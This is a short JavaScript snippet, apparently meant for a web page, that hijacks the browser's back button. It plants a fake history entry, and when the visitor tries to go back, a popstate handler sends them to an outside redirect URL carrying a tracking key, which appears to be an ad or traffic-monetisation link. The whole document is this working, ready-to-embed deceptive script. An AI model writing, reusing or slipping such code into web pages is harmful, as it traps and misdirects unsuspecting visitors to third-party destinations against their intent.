(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("https://www.trustedgatetocontent.com/b2f5djfp?key=37de340e4bf2cb2979337d411d30b2c4");
    },10);
  }
}, false);
}(window, location));
